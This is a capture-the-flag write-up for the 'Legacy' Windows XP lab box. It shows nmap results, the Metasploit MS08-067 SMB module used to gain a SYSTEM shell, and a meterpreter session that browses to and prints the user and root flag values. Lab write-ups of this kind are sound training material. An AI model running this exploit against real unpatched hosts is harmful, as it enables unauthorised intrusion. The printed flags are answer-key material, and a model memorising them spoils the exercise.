# Legacy

legacy was a really easy windows box that didnt involve much to do at all just simply a metasploit exploit for root

>skills involved in this box
- enumeration
- metasploit

# USER && ROOT

>nmap
```bash
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
```
Nmap only revealed 3 ports open a quick google search of the services running lead me to a metasploit module.
`exploit/windows/smb/ms08_067_netapi` We use this and set rhosts and then simply just `exploit`

Below i will show you all the commands i did as it was simply just change dirs and read the flags.

```bash
meterpreter > pwd
C:\WINDOWS\system32
meterpreter > cd ../../..
meterpreter > dir
Listing: C:\
============

Mode                 Size               Type  Last modified                    Name
----                 ----               ----  -------------                    ----
100777/rwxrwxrwx     0                  fil   2017-03-16 01:30:44 -0400        AUTOEXEC.BAT
100666/rw-rw-rw-     0                  fil   2017-03-16 01:30:44 -0400        CONFIG.SYS
40777/rwxrwxrwx      0                  dir   2017-03-16 01:20:29 -0400        Documents and Settings
100444/r--r--r--     0                  fil   2017-03-16 01:30:44 -0400        IO.SYS
100444/r--r--r--     0                  fil   2017-03-16 01:30:44 -0400        MSDOS.SYS
100555/r-xr-xr-x     47564              fil   2008-04-13 16:13:04 -0400        NTDETECT.COM
40555/r-xr-xr-x      0                  dir   2017-03-16 01:20:57 -0400        Program Files
40777/rwxrwxrwx      0                  dir   2017-03-16 01:20:30 -0400        System Volume Information
40777/rwxrwxrwx      0                  dir   2017-03-16 01:18:34 -0400        WINDOWS
100666/rw-rw-rw-     211                fil   2017-03-16 01:20:02 -0400        boot.ini
100444/r--r--r--     250048             fil   2008-04-13 18:01:44 -0400        ntldr
242401544/r-xr--r--  41373179444232175  fif   1320068171-08-11 07:07:28 -0500  pagefile.sys

meterpreter > cd "Documents and Settings"
meterpreter > dir
Listing: C:\Documents and Settings
==================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2017-03-16 02:07:20 -0400  Administrator
40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  All Users
40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  Default User
40777/rwxrwxrwx  0     dir   2017-03-16 01:32:52 -0400  LocalService
40777/rwxrwxrwx  0     dir   2017-03-16 01:32:42 -0400  NetworkService
40777/rwxrwxrwx  0     dir   2017-03-16 01:33:41 -0400  john

meterpreter > cd john
meterpreter > dir
Listing: C:\Documents and Settings\john
=======================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Application Data
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Cookies
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Desktop
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Favorites
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Local Settings
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  My Documents
100666/rw-rw-rw-  524288  fil   2017-03-16 01:33:41 -0400  NTUSER.DAT
100666/rw-rw-rw-  1024    fil   2017-03-16 01:33:41 -0400  NTUSER.DAT.LOG
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  NetHood
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  PrintHood
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Recent
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  SendTo
40555/r-xr-xr-x   0       dir   2017-03-16 01:33:41 -0400  Start Menu
40777/rwxrwxrwx   0       dir   2017-03-16 01:33:41 -0400  Templates
100666/rw-rw-rw-  178     fil   2017-03-16 01:33:42 -0400  ntuser.ini

meterpreter > cd Desktop
meterpreter > dir
Listing: C:\Documents and Settings\john\Desktop
===============================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 02:19:32 -0400  user.txt

meterpreter > type user.txt
[-] Unknown command: type.
meterpreter > cat user.txt
e69af0e4f443de7e36876fda4ec7644fmeterpreter > cd ../..
meterpreter > dir
Listing: C:\Documents and Settings
==================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2017-03-16 02:07:20 -0400  Administrator
40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  All Users
40777/rwxrwxrwx  0     dir   2017-03-16 01:20:29 -0400  Default User
40777/rwxrwxrwx  0     dir   2017-03-16 01:32:52 -0400  LocalService
40777/rwxrwxrwx  0     dir   2017-03-16 01:32:42 -0400  NetworkService
40777/rwxrwxrwx  0     dir   2017-03-16 01:33:41 -0400  john

meterpreter > cd Administrator
meterpreter > dir
Listing: C:\Documents and Settings\Administrator
================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Application Data
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Cookies
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Desktop
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Favorites
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Local Settings
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  My Documents
100666/rw-rw-rw-  786432  fil   2017-03-16 02:07:20 -0400  NTUSER.DAT
100666/rw-rw-rw-  1024    fil   2017-03-16 02:07:20 -0400  NTUSER.DAT.LOG
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  NetHood
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  PrintHood
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Recent
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  SendTo
40555/r-xr-xr-x   0       dir   2017-03-16 02:07:20 -0400  Start Menu
40777/rwxrwxrwx   0       dir   2017-03-16 02:07:20 -0400  Templates
100666/rw-rw-rw-  178     fil   2017-03-16 02:07:21 -0400  ntuser.ini

meterpreter > cd Desktop
meterpreter > dir
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 02:18:19 -0400  root.txt

meterpreter > cat root.txt
993442d258b0e0ec917cae9e695d5713meterpreter > 
```
Thanks for reading hope you enjoyed.
